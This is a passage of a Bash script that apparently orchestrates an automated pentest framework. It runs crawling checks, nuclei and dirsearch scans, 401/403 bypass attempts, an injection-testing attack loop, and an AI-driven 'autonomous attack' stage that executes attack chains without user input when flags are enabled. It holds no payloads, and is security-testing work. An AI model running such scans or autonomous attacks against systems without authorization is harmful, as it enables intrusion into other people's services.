    [ -s "$OUTPUT_DIR/04_http_discovery/http_confirmed.json" ] || { log_warn "http_confirmed.json missing — skipping SBOM"; return 0; }

    run_tool_timeout 180 sbom python3 "$script_path" --scan-dir "$OUTPUT_DIR" || log_warn "sbom exited non-zero"

    local n=$(count_lines "$OUTPUT_DIR/25_sbom/sbom.jsonl" 2>/dev/null || echo 0)
    log_info "SBOM components: $n"
    update_statistics "sbom_components" "$n" 2>/dev/null || true
    return 0
}

###################################################################################################
# MODULE: Crawl Reverify — httpx alive check on crawled URLs.
# Drops DNS-dead / connection-dead URLs before URL Inventory finalizes.
###################################################################################################
module_crawl_reverify() {
    local target="$1"
    log_section "MODULE: Crawl Reverify (httpx alive)"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    command -v httpx &>/dev/null || { log_warn "httpx missing; skipping reverify"; return 0; }

    local script_path="$PROJECT_ROOT/discovery/crawl_reverify.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/discovery/crawl_reverify.py"
    [ -f "$script_path" ] || { log_warn "discovery/crawl_reverify.py not found"; return 0; }

    local -a inputs=()
    [ -s "$OUTPUT_DIR/09_crawling/all_urls.txt" ] && inputs+=("$OUTPUT_DIR/09_crawling/all_urls.txt")
    [ -s "$OUTPUT_DIR/09_crawling/gau_urls.txt" ] && inputs+=("$OUTPUT_DIR/09_crawling/gau_urls.txt")
    [ -s "$OUTPUT_DIR/09_crawling/gospider_urls.txt" ] && inputs+=("$OUTPUT_DIR/09_crawling/gospider_urls.txt")
    [ -s "$OUTPUT_DIR/09_crawling/katana_urls.txt" ] && inputs+=("$OUTPUT_DIR/09_crawling/katana_urls.txt")

    if [ ${#inputs[@]} -eq 0 ]; then
        log_info "No crawled URL sources found; skipping reverify"
        return 0
    fi

    mkdir -p "$OUTPUT_DIR/09_crawling"
    run_tool_timeout 900 crawl_reverify python3 "$script_path" \
        --inputs "${inputs[@]}" \
        --out-alive "$OUTPUT_DIR/09_crawling/crawled_alive.jsonl" \
        --out-dead "$OUTPUT_DIR/09_crawling/crawled_dead.jsonl" \
        --timeout 8 --threads 50 || log_warn "crawl_reverify exited non-zero"

    local alive=$(count_lines "$OUTPUT_DIR/09_crawling/crawled_alive.jsonl" 2>/dev/null || echo 0)
    local dead=$(count_lines "$OUTPUT_DIR/09_crawling/crawled_dead.jsonl" 2>/dev/null || echo 0)
    log_info "Crawl reverify: alive=$alive dead=$dead"
    return 0
}

###################################################################################################
# MODULE: Nuclei Non-Web Scan — origin non-web ports (SSH/MySQL/Redis/etc).
# Only origin IPs (CDN non-web already dropped by port_split).
###################################################################################################
module_nuclei_nonweb_scan() {
    local target="$1"
    log_section "MODULE: Nuclei Non-Web Scan (origin ports only)"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    command -v nuclei &>/dev/null || { log_warn "nuclei missing"; return 0; }

    local script_path="$PROJECT_ROOT/ports/nuclei_nonweb_scan.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/ports/nuclei_nonweb_scan.py"
    [ -f "$script_path" ] || { log_warn "ports/nuclei_nonweb_scan.py not found"; return 0; }

    local nonweb_file="$OUTPUT_DIR/14_port_scan/nonweb_origin_ports.jsonl"
    [ -s "$nonweb_file" ] || { log_info "No origin non-web ports; skipping"; return 0; }

    mkdir -p "$OUTPUT_DIR/12_nuclei_scanning"
    local out_file="$OUTPUT_DIR/12_nuclei_scanning/nuclei_nonweb_findings.jsonl"
    run_tool_timeout 1800 nuclei_nonweb_scan python3 "$script_path" \
        --nonweb-file "$nonweb_file" \
        --output "$out_file" \
        --severity "info,low,medium,high,critical" \
        --rate-limit "${NUCLEI_NONWEB_RATE:-100}" || log_warn "nuclei_nonweb_scan exited non-zero"

    local nonweb_findings=$(count_lines "$out_file" 2>/dev/null || echo 0)
    log_info "Nuclei non-web findings: $nonweb_findings"
    update_statistics "nuclei_nonweb_findings" "$nonweb_findings"
    return 0
}

###################################################################################################
# MODULE: API Directory Scan — second dirsearch pass on API-classified URL roots.
# Runs AFTER endpoint_consolidation so the class-aware target file is ready.
# Uses a wider status-code allowlist (includes 201/202/204/400/404/405/409/422/429)
# that is appropriate for REST/JSON APIs where non-200 responses carry meaning.
# Results are merged back into the main dirsearch.txt for downstream consolidation.
###################################################################################################
module_api_directory_scan() {
    local target="$1"
    log_section "MODULE: api_directory_scan (API-specific second dirsearch pass)"

    local api_targets="$OUTPUT_DIR/08_directory_discovery/dirsearch_api_targets.txt"
    if [ ! -s "$api_targets" ]; then
        log_info "dirsearch_api_targets.txt missing or empty — no API-specific pass needed"
        return 0
    fi

    local api_count
    api_count=$(wc -l < "$api_targets" 2>/dev/null | tr -d ' ' || echo 0)
    log_info "API dirsearch: $api_count URL roots with wide status allowlist"

    mkdir -p "$OUTPUT_DIR/08_directory_discovery/dirsearch_api"
    local ds_log="$OUTPUT_DIR/08_directory_discovery/dirsearch_api/dirsearch.txt"

    # Prefer an API-focused wordlist; fall back to common.txt
    local api_wl="${WORDLIST_DIR}/api_paths.txt"
    [ -s "$api_wl" ] || api_wl="${WORDLIST_DIR}/common.txt"

    if ! command -v dirsearch &>/dev/null; then
        log_warn "dirsearch not found — skipping API directory scan"
        return 0
    fi

    local _ds_extra=()
    local _cookie_hdr=$(session_cookie_header)
    [ -n "$_cookie_hdr" ] && _ds_extra+=(--cookie "$_cookie_hdr")
    run_tool api_directory_scan dirsearch -l "$api_targets" \
        -w "$api_wl" \
        -i 200,201,202,204,301,302,400,401,403,404,405,409,422,429,500,502,503,504 \
        -r -R 1 \
        -o "$ds_log" \
        -t 80 \
        --user-agent "$HUMAN_USER_AGENT" \
        "${_ds_extra[@]}" \
        -q || true

    # Merge API-specific hits into main dirsearch output so endpoint_consolidation
    # already-ran note: this is safe to append post-consolidation; the next
    # ledger_ingest / reporting pass will pick up the enriched inventory.
    if [ -f "$ds_log" ] && [ -s "$ds_log" ]; then
        cat "$ds_log" >> "$OUTPUT_DIR/08_directory_discovery/dirsearch/dirsearch.txt" 2>/dev/null || true
        local hit_count
        hit_count=$(wc -l < "$ds_log" 2>/dev/null | tr -d ' ' || echo 0)
        log_info "API dirsearch: $hit_count lines merged into main dirsearch.txt"
        update_statistics "api_directory_findings" "$hit_count"
    fi
    return 0
}

###################################################################################################
# MODULE: Access Control Pipeline — standalone 401/403 bypass + WAF signature.
# Now runs AFTER URL Inventory finalizes (as opposed to streaming during
# dirsearch), so it catches 401/403 URLs from every discovery source, not
# just dirsearch hits.
###################################################################################################
module_access_control() {
    local target="$1"
    log_section "MODULE: Access Control (401/403 bypass + WAF classify)"

    command -v python3 &>/dev/null || { log_warn "python3 missing"; return 0; }
    local script_path="$PROJECT_ROOT/discovery/access_control_pipeline.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/discovery/access_control_pipeline.py"
    [ -f "$script_path" ] || { log_warn "discovery/access_control_pipeline.py not found"; return 0; }

    local inv="$OUTPUT_DIR/08_directory_discovery/discovered_endpoints.jsonl"
    [ -s "$inv" ] || { log_warn "URL Inventory empty; skipping access control"; return 0; }

    # Extract 401/403 URLs from URL Inventory
    local targets_file="$OUTPUT_DIR/08_directory_discovery/access_control_targets.txt"
    python3 - "$inv" "$targets_file" << 'PY_AC_TARGETS' 2>/dev/null
import json, sys
inv, out = sys.argv[1], sys.argv[2]
seen = set()
with open(out, "w") as w:
    for line in open(inv, errors="ignore"):
        line = line.strip()
        if not line: continue
        try: r = json.loads(line)
        except Exception: continue
        if r.get("status") in (401, 403):
            u = r.get("sample_url") or r.get("url")
            if u and u not in seen:
                seen.add(u)
                w.write(u + "\n")
PY_AC_TARGETS
    local target_count=$(count_lines "$targets_file" 2>/dev/null || echo 0)
    if [ "$target_count" -eq 0 ]; then
        log_info "No 401/403 URLs in inventory; skipping access control"
        return 0
    fi
    log_info "Access control targets: $target_count"

    # Simulate a dirsearch-style log so the pipeline's tail-based reader
    # can consume URL Inventory targets uniformly.
    local ds_log="$OUTPUT_DIR/08_directory_discovery/access_control_input.log"
    awk '{print "403  0B   "$0}' "$targets_file" > "$ds_log"
    local ds_marker="${ds_log}.done"
    touch "$ds_marker"

    local bypass_out="$OUTPUT_DIR/08_directory_discovery/bypass_findings.jsonl"
    local waf_out="$OUTPUT_DIR/08_directory_discovery/waf_blocked.jsonl"

    run_tool_timeout "${ACP_DRAIN_TIMEOUT:-600}" access_control python3 "$script_path" \
        --input-log "$ds_log" \
        --end-marker "$ds_marker" \
        --bypass-output "$bypass_out" \
        --waf-output "$waf_out" \
        --bypass-threads "${BYPASS_403_THREADS:-12}" \
        --waf-threads "${ACP_WAF_THREADS:-8}" \
        --timeout "${BYPASS_403_TIMEOUT:-8}" || log_warn "access_control exited non-zero"

    local bypasses=$(count_lines "$bypass_out" 2>/dev/null || echo 0)
    local waf_hits=$(count_lines "$waf_out" 2>/dev/null || echo 0)
    log_info "Access control: bypasses=$bypasses waf_blocked=$waf_hits"
    update_statistics "bypass_findings" "$bypasses"
    return 0
}

###################################################################################################
module_response_intel() {
    local target="$1"
    log_section "MODULE 26: Response Intelligence (NLP passive response analysis)"

    command -v python3 &>/dev/null || { log_warn "python3 missing; skipping response intel"; return 0; }

    local script_path="$PROJECT_ROOT/intel/response_intel.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/intel/response_intel.py"
    if [ ! -f "$script_path" ]; then
        log_warn "intel/response_intel.py not found; skipping"
        return 0
    fi

    mkdir -p "$OUTPUT_DIR/26_response_intel"

    local max_urls="${RI_MAX_URLS:-5000}"
    local timeout="${RI_TIMEOUT:-8}"
    local workers="${RI_WORKERS:-15}"
    local budget="${RI_BUDGET:-600}"

    log_info "Scanning up to $max_urls URLs from inventory for response intelligence…"
    run_tool_timeout "$budget" response_intel python3 "$script_path" \
        "$OUTPUT_DIR" --target "$target" \
        --max-urls "$max_urls" --timeout "$timeout" \
        --workers "$workers" --budget "$budget" \
        --summary || \
        log_warn "response_intel exited non-zero (partial output may exist)"

    local findings_file="$OUTPUT_DIR/26_response_intel/response_findings_deduped.jsonl"
    local total=0
    [ -f "$findings_file" ] && total=$(count_lines "$findings_file")
    log_info "Response Intelligence: $total finding(s)"
    if [ "$total" -gt 0 ]; then
        jq -r '"  [\(.severity)/\(.confidence)] \(.type) — \(.host) — \(.url)"' \
            "$findings_file" 2>/dev/null | head -15 || true
    fi
    update_statistics "response_intel_findings" "$total"
}

###################################################################################################
# MODULE 27: ADAPTIVE ENDPOINT ATTACK LOOP — offensive/adaptive_loop.py
# Per-endpoint FSM (observe→classify→hypothesize→mutate→fire→verify→chain) seeded
# from the classified URL inventory + response_intel's attack_hypotheses.jsonl.
# Deterministic recipes (SQLi/XSS/SSTI/LFI/SSRF/redirect/cmd-injection/dangerous-
# methods) with an optional AI brain; GET/OPTIONS-only, ScopeGuard-locked,
# budgeted, differential-confirmed via the 0%-FP oracle library. Confirmed
# findings are nuclei-shaped → chained by Module L6. Runs AFTER response_intel
# (needs its hypotheses) and BEFORE attack_paths.
###################################################################################################
module_adaptive_loop() {
    local target="$1"
    log_section "MODULE 27: Adaptive Endpoint Attack Loop (per-endpoint FSM)"

    if [ "$ADAPTIVE_LOOP_ENABLED" != "true" ]; then
        log_warn "Adaptive loop disabled (ADAPTIVE_LOOP_ENABLED=false)"
        return 0
    fi
    command -v python3 &>/dev/null || { log_warn "python3 missing; skipping adaptive loop"; return 0; }

    local script_path="$PROJECT_ROOT/offensive/adaptive_loop.py"
    [ -f "$script_path" ] || script_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/offensive/adaptive_loop.py"
    if [ ! -f "$script_path" ]; then
        log_warn "offensive/adaptive_loop.py not found; skipping"
        return 0
    fi

    mkdir -p "$OUTPUT_DIR/27_adaptive_loop"

    local -a args=("$OUTPUT_DIR" --target "$target"
                   --max-requests "$ADAPTIVE_LOOP_MAX_REQUESTS"
                   --max-seeds "$ADAPTIVE_LOOP_MAX_SEEDS"
                   --budget "$ADAPTIVE_LOOP_BUDGET")
    [ "$ADAPTIVE_LOOP_AI" = "true" ] && args+=(--ai)

    log_info "Running adaptive attack loop (GET/OPTIONS-only, differential-confirmed)…"
    run_tool_timeout "$ADAPTIVE_LOOP_BUDGET" adaptive_loop python3 "$script_path" "${args[@]}" || \
        log_warn "adaptive_loop exited non-zero/timed out (partial output may exist)"

    local findings_file="$OUTPUT_DIR/27_adaptive_loop/loop_findings.jsonl"
    local total=0
    [ -f "$findings_file" ] && total=$(count_lines "$findings_file")
    log_info "Adaptive loop: $total finding(s)"
    if [ "$total" -gt 0 ]; then
        jq -r '"  [\(.info.severity)] \(.info.name) — \(.host)"' "$findings_file" 2>/dev/null | head -12 || true
    fi
    update_statistics "adaptive_loop_findings" "$total"
}

###################################################################################################
# MODULE L6: CAPEC ATTACK-PATH CHAINING (intel/capec_attack_paths.py)
# Runs AFTER internet_intel so it chains VALIDATED findings. Loads MITRE CAPEC v3.9
# into a knowledge graph and walks CanPrecede edges to build ranked attack paths.
###################################################################################################
module_attack_paths() {
    local target="$1"
    log_section "MODULE L6: CAPEC Attack-Path Chaining"
    local script_path="$PROJECT_ROOT/intel/capec_attack_paths.py"
    local capec_xml="$PROJECT_ROOT/capec_v3.9/capec_v3.9.xml"
    if [ ! -f "$script_path" ] || [ ! -f "$capec_xml" ] || ! command -v python3 &>/dev/null; then
        log_warn "intel/capec_attack_paths.py or CAPEC data missing — skipping attack-path chaining"
        return 0
    fi
    if run_tool attack_paths python3 "$script_path" "$OUTPUT_DIR" --summary; then
        log_info "Attack-path chaining completed"
    else
        log_warn "Attack-path chaining exited non-zero (partial output may exist)"
    fi
    local np=0
    [ -f "$OUTPUT_DIR/25_attack_paths/capec_attack_paths.json" ] && \
        np=$(python3 -c "import json; print(len(json.load(open('$OUTPUT_DIR/25_attack_paths/capec_attack_paths.json')).get('paths',[])))" 2>/dev/null || echo 0)
    log_info "Attack paths built: $np"
    update_statistics "attack_paths" "$np"

    # attack_chain_v2.ROADMAP.md Phase 0 — v1 above is unchanged and remains the
    # production path. This flag is a no-op scaffold until Phases 1-6 land: when
    # set, v2 runs ADDITIONALLY (never in place of v1) so both outputs can be
    # diffed side by side before v2 is ever trusted as the default. Default off.
    if [ "${ARISE_ATTACK_CHAIN_V2:-false}" == "true" ]; then
        log_info "ARISE_ATTACK_CHAIN_V2=true — v2 not yet implemented (attack_chain_v2.ROADMAP.md Phase 1+); v1 output above stands"
    fi
}

###################################################################################################
# AUTONOMOUS ATTACK — runs AFTER chaining, DRIVEN BY the tagged attack paths.
# No user input: once the scan finishes and attack_paths tags the possible attacks, the
# autonomous engine automatically executes those tagged chains (skill-driven, scope-guarded,
# confirm-not-exploit), then re-chains so newly confirmed findings fold into the final paths.
# Runs automatically when AUTONOMOUS_ENABLED=true AND a provider key is present.
###################################################################################################
module_autonomous_attack() {
    local target="$1"
    log_section "AUTONOMOUS ATTACK — execute the tagged attack chains"

    if [ "${AUTONOMOUS_ENABLED:-false}" != "true" ]; then
        log_info "Autonomous attack disabled (set AUTONOMOUS_ENABLED=true + a provider key to auto-attack)"
        return 0
    fi
    if [ ! -f "$PROJECT_ROOT/offensive/offensive_engine.py" ] || ! command -v python3 &>/dev/null; then
        log_warn "offensive/offensive_engine.py or python3 missing — skipping autonomous attack"
        return 0
    fi

    local synth_dir="$OUTPUT_DIR/08d_attack_synth"; mkdir -p "$synth_dir"
    # Autonomous engine is DRIVEN BY the attack paths (offensive_engine reads
    # 25_attack_paths/*.json and builds its objective from the tagged chains'
    # next_actions). Confirmed findings append to nuclei_results.txt.
    log_info "Autonomous engine attacking the tagged chains (max ${AUTONOMOUS_MAX_ACTIONS:-25} actions)..."
    run_tool autonomous_attack python3 "$PROJECT_ROOT/offensive/offensive_engine.py" "$OUTPUT_DIR" \
        --out "$synth_dir" --autonomous --target "$target" \
        --max-actions "${AUTONOMOUS_MAX_ACTIONS:-25}" --summary || true

    local auto_conf=0
    [ -f "$synth_dir/offensive_summary.json" ] && \
        auto_conf=$(python3 -c "import json;print(json.load(open('$synth_dir/offensive_summary.json')).get('autonomous',{}).get('written_to_pipeline',0))" 2>/dev/null || echo 0)
    update_statistics "autonomous_findings" "$auto_conf"

    # Re-chain so autonomous-confirmed findings fold into the final attack paths.
    if [ "${auto_conf:-0}" -gt 0 ] && [ -f "$PROJECT_ROOT/intel/capec_attack_paths.py" ]; then
        log_info "Autonomous engine confirmed $auto_conf finding(s) — re-chaining to update attack paths"
        run_tool attack_paths_rechain python3 "$PROJECT_ROOT/intel/capec_attack_paths.py" "$OUTPUT_DIR" --summary || true
    else
        log_info "Autonomous attack: no new confirmed findings to fold into the chain"
    fi
}

###################################################################################################
# MODULE 28: ARISEAI AUTONOMOUS RED-TEAM PENTEST (ai_analyst package)
# The rebuilt autonomous AI pentester — SUPERSEDES autonomous_attack in the default run. Reasons
# over ALL collected evidence, ranks attack hypotheses/chains, (optionally) live-verifies the top
# ones via the scope-guarded differential engine and the merged autonomous tool-exec tier, then
# emits proven PoC-backed findings + a red-team report into 28_ai_analyst/ (merged into the vuln
# list with an AI badge). Reasoning + report are always safe (no new traffic); the live tiers are
# opt-in. Auto-runs when the ai_analyst package is present; arise_jobs injects ARISE_AI_PROVIDER/
# MODEL + the vault key so it uses the operator's configured provider (degrades to evidence-only
# with no key).
###################################################################################################
###################################################################################################
# ARISEAI RECON ANALYSIS — early-stage attack surface assessment (runs after endpoint consolidation)
# Produces a lightweight assessment from recon data (Modules 1-9): tech stacks, WAFs, OSINT signals,
# missing headers, exposed ports. Helps prioritize the full scan. Does NOT send any live traffic.
###################################################################################################
module_ai_recon_analysis() {
    local target="$1"
    log_section "MODULE: AriseAI Recon Analysis (attack surface assessment)"
    if [ "${AI_RECON_ANALYSIS_ENABLED:-true}" != "true" ]; then
        log_info "AriseAI recon analysis disabled (AI_RECON_ANALYSIS_ENABLED=false)"
        return 0
    fi
    if [ ! -d "$PROJECT_ROOT/ai_analyst" ] || ! command -v python3 &>/dev/null; then
        log_warn "ai_analyst package or python3 missing — skipping recon analysis"
        return 0
    fi
    local args=("$OUTPUT_DIR" --target "$target" --recon-only --no-live-verify --summary)
    if run_tool ai_recon_analysis env "PYTHONPATH=$PROJECT_ROOT${PYTHONPATH:+:$PYTHONPATH}" python3 -m ai_analyst "${args[@]}"; then
        log_info "AriseAI recon analysis completed"
    else
        log_warn "AriseAI recon analysis exited non-zero (partial output may exist)"
    fi
}

module_ai_analyst() {
    local target="$1"
    log_section "MODULE 28: AriseAI Autonomous Red-Team Pentest"
    if [ "${AI_ANALYST_ENABLED:-true}" != "true" ]; then
        log_info "AriseAI pentest disabled (AI_ANALYST_ENABLED=false)"
        return 0
    fi
    if [ ! -d "$PROJECT_ROOT/ai_analyst" ] || ! command -v python3 &>/dev/null; then
        log_warn "ai_analyst package or python3 missing — skipping AriseAI pentest"
        return 0
    fi
    local args=("$OUTPUT_DIR" --target "$target" --summary)
    [ -n "${AI_ANALYST_OBJECTIVE:-}" ] && args+=(--objective "$AI_ANALYST_OBJECTIVE")
    [ -n "${AI_ANALYST_ADVERSARY:-}" ] && args+=(--adversary "$AI_ANALYST_ADVERSARY")
    # Tier 2 — differential live-verify (offensive_verify already fired upstream, so default off).
    [ "${AI_ANALYST_LIVE_VERIFY:-false}" = "true" ] || args+=(--no-live-verify)
    # Tier 3 — the merged Autonomous Action live-tool loop (opt-in, like the old
    # AUTONOMOUS_ENABLED). RT4: requires explicit per-run authorization — the tier
    # refuses to fire unless AI_ANALYST_AUTHZ_CONFIRMED=true (passed as --authorized).
    if [ "${AI_ANALYST_AUTONOMOUS:-false}" = "true" ]; then
        args+=(--autonomous-exec --autonomous-budget "${AI_ANALYST_MAX_ACTIONS:-25}")
        [ "${AI_ANALYST_AUTHZ_CONFIRMED:-false}" = "true" ] && args+=(--authorized)
    fi
    # env PYTHONPATH makes `-m ai_analyst` resolvable regardless of cwd (bulletproof).
    if run_tool ai_analyst env "PYTHONPATH=$PROJECT_ROOT${PYTHONPATH:+:$PYTHONPATH}" python3 -m ai_analyst "${args[@]}"; then
        log_info "AriseAI pentest completed"
    else
        log_warn "AriseAI pentest exited non-zero (partial output may exist)"
    fi
    local np=0
    [ -f "$OUTPUT_DIR/28_ai_analyst/ai_analyst_result.json" ] && \
        np=$(python3 -c "import json;print(json.load(open('$OUTPUT_DIR/28_ai_analyst/ai_analyst_result.json')).get('counts',{}).get('proven',0))" 2>/dev/null || echo 0)
    log_info "AriseAI proven findings: $np"
    update_statistics "ai_analyst_proven" "$np"
}

module_ledger_ingest() {
    # Upsert this scan's discovered assets into the durable per-target Asset
    # Ledger (state/<target>/ledger/). Non-breaking: reads existing outputs,
    # writes only under state/. Enables incremental/selective scans + the
    # historic asset dashboard. Set ARISE_LEDGER=0 to skip.
    local target="$1"
    log_section "MODULE: Asset Ledger Ingest"
    [ "${ARISE_LEDGER:-1}" = "0" ] && { log_info "Ledger ingest disabled (ARISE_LEDGER=0)"; return 0; }

    local script="$PROJECT_ROOT/history/ledger.py"
    [ ! -f "$script" ] && script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/history/ledger.py"
    if [ ! -f "$script" ] || ! command -v python3 &>/dev/null; then
        log_warn "history/ledger.py or python3 missing; skipping ledger ingest"
        return 0
    fi
    local scan_id; scan_id="$(basename "$OUTPUT_DIR")"
    if python3 "$script" ingest --target "$target" --scan-dir "$OUTPUT_DIR" \
            --scan-id "$scan_id" --root "$PROJECT_ROOT/state" 2>"$OUTPUT_DIR/ledger_ingest.stderr"; then
        log_info "Asset ledger updated for $target"
    else
        log_warn "ledger ingest returned non-zero (continuing) — see ledger_ingest.stderr"
    fi

    # Emit the delta (what's new this scan) — always useful, and the input the
    # incremental verifier / historic dashboard consume.
    local diff_script="$PROJECT_ROOT/history/arise_diff.py"
    [ ! -f "$diff_script" ] && diff_script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/history/arise_diff.py"
    if [ -f "$diff_script" ]; then
        python3 "$diff_script" --target "$target" --scan-id "$scan_id" \
            --root "$PROJECT_ROOT/state" \
            --out "$OUTPUT_DIR/asset_delta.json" \
            --targets-out "$OUTPUT_DIR/new_targets.json" \
            2>>"$OUTPUT_DIR/ledger_ingest.stderr" || \
            log_warn "delta computation returned non-zero (continuing)"
    fi

    # Regression report: which previously-open issues are now fixed / regressed.
    # Reads the lifecycle kaiju_issues maintains (correlate runs when findings
    # are computed) and drops a scan-time regression.json.
    local reg_script="$PROJECT_ROOT/history/arise_regression.py"
    [ ! -f "$reg_script" ] && reg_script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/history/arise_regression.py"
    if [ -f "$reg_script" ] && [ -f "$PROJECT_ROOT/state/$target/issues-state.json" ]; then
        python3 "$reg_script" --target "$target" --scan-id "$scan_id" \
            --out "$OUTPUT_DIR/regression.json" \
            2>>"$OUTPUT_DIR/ledger_ingest.stderr" || \
            log_warn "regression report returned non-zero (continuing)"
    fi
    return 0
}

module_har_ingest() {
    local target="$1"
    log_section "MODULE 0-HAR: HAR/Browser-Trace Ingestor (R1)"
    if [ ! -f "$PROJECT_ROOT/evidence/har_ingest.py" ]; then
        log_warn "evidence/har_ingest.py not found — skipping HAR ingest (R1 not installed)"
        return 0
    fi
    run_tool har_ingest python3 "$PROJECT_ROOT/evidence/har_ingest.py" "$target" --scan-dir "$OUTPUT_DIR" 2>&1 || \
        log_warn "evidence/har_ingest.py failed (continuing — HAR optional)"
    return 0
}

module_burp_bridge_ingest() {
    local target="$1"
    log_section "MODULE 0-BURP: Burp Bridge Ingestor (authenticated evidence)"
    if [ ! -f "$PROJECT_ROOT/api_security/burp_bridge_ingest.py" ]; then
        log_warn "api_security/burp_bridge_ingest.py not found — skipping (Burp bridge not installed)"
        return 0
    fi
    # Auto-discovers an excalibur-burp-bridge/v1 bundle under the scan dir / CWD;
    # gracefully no-ops when no bundle is present. Emits role-labelled captures
    # that upgrade the whole API-attack chain (auth_oracle + bfla go authenticated).
    run_tool burp_bridge_ingest python3 "$PROJECT_ROOT/api_security/burp_bridge_ingest.py" "$OUTPUT_DIR" --summary 2>&1 || \
        log_warn "api_security/burp_bridge_ingest.py failed (continuing — bridge optional)"
    return 0
}

module_api_logic() {
    local target="$1"
    log_section "MODULE 24-API: API Logic Analysis (5 passive analyzers)"
    if [ ! -f "$PROJECT_ROOT/api_security/api_logic_analysis.py" ]; then
        log_warn "api_security/api_logic_analysis.py not found — skipping (API logic layer not installed)"
        return 0
    fi
    # Stage 1 "Understand": counterfactual / golden-ticket / state-transition /
    # token-lineage / parity-drift over captured evidence. Zero packets sent;
    # emits leads capped at L3 into 24_api_attack/ for the dashboard + oracle.
    run_tool api_logic python3 "$PROJECT_ROOT/api_security/api_logic_analysis.py" "$OUTPUT_DIR" --summary 2>&1 || \
        log_warn "api_security/api_logic_analysis.py failed (continuing)"
    return 0
}

module_flow_reconstruct() {
    local target="$1"
    log_section "MODULE 0-FLOW: Flow Reconstructor (R2)"
    if [ ! -f "$PROJECT_ROOT/evidence/flow_reconstruct.py" ]; then
        log_warn "evidence/flow_reconstruct.py not found — skipping (R2 not installed)"
        return 0
    fi
    run_tool flow_reconstruct python3 "$PROJECT_ROOT/evidence/flow_reconstruct.py" --scan-dir "$OUTPUT_DIR" 2>&1 || \
        log_warn "evidence/flow_reconstruct.py failed (continuing)"
    return 0
}

module_identity_graph() {
    local target="$1"
    log_section "MODULE 0-IDG: Identity/Object Graph (R3)"
    if [ ! -f "$PROJECT_ROOT/evidence/identity_graph.py" ]; then
        log_warn "evidence/identity_graph.py not found — skipping (R3 not installed)"
        return 0
    fi
    run_tool identity_graph python3 "$PROJECT_ROOT/evidence/identity_graph.py" --scan-dir "$OUTPUT_DIR" 2>&1 || \
        log_warn "evidence/identity_graph.py failed (continuing)"
    return 0
}

module_wss_agent() {
    local target="$1"
    log_section "MODULE 24-WSS: WebSocket Specialist (R6)"
    if [ ! -f "$PROJECT_ROOT/evidence/wss_agent.py" ]; then
        log_warn "evidence/wss_agent.py not found — skipping (R6 not installed)"
        return 0
    fi
    run_tool wss_agent python3 "$PROJECT_ROOT/evidence/wss_agent.py" "$OUTPUT_DIR" --target "$target" 2>&1 || \
        log_warn "evidence/wss_agent.py failed (continuing)"
    return 0
}

module_auth_oracle() {
    local target="$1"
    log_section "MODULE 24-AUTHZ: Authorization Oracle (R5)"
    if [ ! -f "$PROJECT_ROOT/api_security/auth_oracle.py" ]; then
        log_warn "api_security/auth_oracle.py not found — skipping (R5 not installed)"
        return 0
    fi
    # F08/P2-14 (ARISE_REMEDIATION_ROADMAP.md): this real multi-identity
    # differential oracle has always needed a hand-authored auth_contexts.json
    # at scan root that nothing ever wrote — it silently no-op'd on every
    # single scan since the module was added. Synthesize one automatically
    # from the session cookie(s) already collected for this scan (the "Add
    # Target" session-cookie field(s)) whenever one isn't already present:
    # identity A (owner) + an anonymous baseline is enough to catch "any
    # authenticated object readable with no auth at all"; identity B, when
    # supplied, additionally enables the full cross-account A-vs-B diff.
    local auth_ctx_file="$OUTPUT_DIR/auth_contexts.json"
    if [ ! -s "$auth_ctx_file" ] && [ -n "${ARISE_SESSION_COOKIE:-}" ]; then
        python3 - "$auth_ctx_file" "$ARISE_SESSION_COOKIE" "${ARISE_SESSION_COOKIE_B:-}" << 'AUTHCTX_EOF'
import json, sys
out_path, cookie_a, cookie_b = sys.argv[1], sys.argv[2], sys.argv[3]
contexts = [{"name": "user_a", "type": "cookie", "value": cookie_a}]
if cookie_b:
    contexts.append({"name": "user_b", "type": "cookie", "value": cookie_b})
contexts.append({"name": "anonymous", "type": "none"})
with open(out_path, "w") as f:
    json.dump({"auth_contexts": contexts}, f, indent=2)
AUTHCTX_EOF
        log_info "auth_oracle: synthesized auth_contexts.json from session cookie(s) ($([ -n "${ARISE_SESSION_COOKIE_B:-}" ] && echo "2 identities" || echo "1 identity") + anonymous)"
    fi
    if [ ! -s "$auth_ctx_file" ]; then
        log_info "auth_oracle: no session cookie supplied for this scan — skipping (gray-box only)"
        return 0
    fi
    run_tool auth_oracle python3 "$PROJECT_ROOT/api_security/auth_oracle.py" "$OUTPUT_DIR" --target "$target" 2>&1 || \
        log_warn "api_security/auth_oracle.py failed or no auth_contexts (continuing)"
    return 0
}

module_target_memory() {
    local target="$1"
    local scan_id="$SCAN_ID"
    log_section "MODULE R8: Per-Target Learning Memory Harvest"
    if [ ! -f "$PROJECT_ROOT/evidence/target_memory.py" ]; then
        log_warn "evidence/target_memory.py not found — skipping (R8 not installed)"
        return 0
    fi
    run_tool target_memory python3 "$PROJECT_ROOT/evidence/target_memory.py" harvest \
        --target "$target" --scan-dir "$OUTPUT_DIR" --scan-id "$scan_id" \
        --root "$PROJECT_ROOT/state" 2>&1 || \
        log_warn "evidence/target_memory.py harvest failed (continuing)"
    return 0
}

module_reporting() {
    local target="$1"
    log_section "MODULE 14: Reporting"

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/reports/$(make_iso_filename "$target" "report" "final")"
    
    log_info "Generating comprehensive reports..."
    
    # Generate JSON report
    python3 << PYTHON_EOF
import json
import os
import sys
from datetime import datetime

target = "$target"
output_dir = "$OUTPUT_DIR"
reports_dir = "$OUTPUT_DIR/reports"

# Read manifest
manifest = {}
try:
    with open("$MANIFEST_FILE", 'r') as f:
        manifest = json.load(f)
except:
    manifest = {}

# Collect module results from the numbered pipeline directories.
modules = {}
for module_dir in os.listdir(output_dir):
    module_path = os.path.join(output_dir, module_dir)
    if not os.path.isdir(module_path) or module_dir in ('logs', 'reports'):
